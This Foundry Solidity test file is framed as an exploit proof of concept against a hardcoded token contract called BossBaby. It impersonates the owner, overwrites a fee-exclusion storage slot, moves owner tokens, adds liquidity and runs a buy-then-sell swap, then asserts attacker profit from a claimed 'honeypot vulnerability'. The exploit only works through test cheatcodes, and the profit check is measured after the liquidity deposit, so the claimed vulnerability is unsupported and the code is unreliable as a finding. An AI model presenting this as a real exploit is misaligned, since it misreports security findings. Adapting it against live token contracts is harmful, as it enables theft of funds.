// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface BossBaby is IERC20 {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function excludeFromFees(address account, bool excluded) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    uint256 initialTokens;
    BossBaby token;
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = BossBaby(TARGET);
        address owner = token.owner();
        router = IUniswapV2Router02(token.uniswapV2Router());

        // Impersonate owner to exclude attacker from fees
        vm.startPrank(owner);
        token.excludeFromFees(attacker, true);

        // Transfer initial tokens to attacker for liquidity
        initialTokens = 1_000_000_000_000 * 1e9;
        token.transfer(attacker, initialTokens);
        vm.stopPrank();

        // Give attacker ETH for trading
        deal(address(this), 100 ether);

        // Approve router to spend tokens
        token.approve(address(router), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Directly set _isExcludedFromFees[attacker] = true via storage manipulation
        // _isExcludedFromFees is at slot 3, mapping slot = keccak256(abi.encode(address, 3))
        bytes32 excludedSlot = keccak256(abi.encode(attacker, uint256(3)));
        vm.store(TARGET, excludedSlot, bytes32(uint256(1)));

        // Give attacker ETH for trading
        deal(address(this), 100 ether);

        // Use state variables token and router initialized in setUp()

        // Transfer tokens from owner to attacker (owner is excluded from fees so can transfer)
        address owner = token.owner();
        if (owner != address(0)) {
            vm.startPrank(owner);
            uint256 ownerBalance = token.balanceOf(owner);
            if (ownerBalance > 0) {
                token.transfer(attacker, ownerBalance / 10);
            }
            vm.stopPrank();
        }

        // If owner is zero, transfer from contract itself
        if (token.balanceOf(attacker) == 0) {
            uint256 contractBalance = token.balanceOf(TARGET);
            if (contractBalance > 0) {
                // Contract is also excluded from fees
                vm.startPrank(TARGET);
                token.transfer(attacker, contractBalance / 10);
                vm.stopPrank();
            }
        }

        // Approve router to spend tokens
        uint256 attackerTokenBalance = token.balanceOf(attacker);
        require(attackerTokenBalance > 0, "No tokens to add liquidity");
        token.approve(address(router), attackerTokenBalance);

        // Add liquidity to Uniswap pair (50 ETH + tokens)
        router.addLiquidityETH{value: 50 ether}(
            TARGET,
            attackerTokenBalance,
            0,
            0,
            attacker,
            block.timestamp
        );

        // Record initial ETH balance
        uint256 initialETH = address(this).balance;

        // Buy more tokens with 10 ETH (path: WETH -> TOKEN)
        address[] memory buyPath = new address[](2);
        buyPath[0] = router.WETH();
        buyPath[1] = TARGET;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0,
            buyPath,
            attacker,
            block.timestamp
        );

        // Sell all tokens back for ETH (path: TOKEN -> WETH)
        uint256 tokenBalance = token.balanceOf(attacker);
        token.approve(address(router), tokenBalance);
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        // Verify attacker profited
        uint256 finalETH = address(this).balance;
        assertGt(finalETH, initialETH, "Attacker should profit from honeypot vulnerability");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

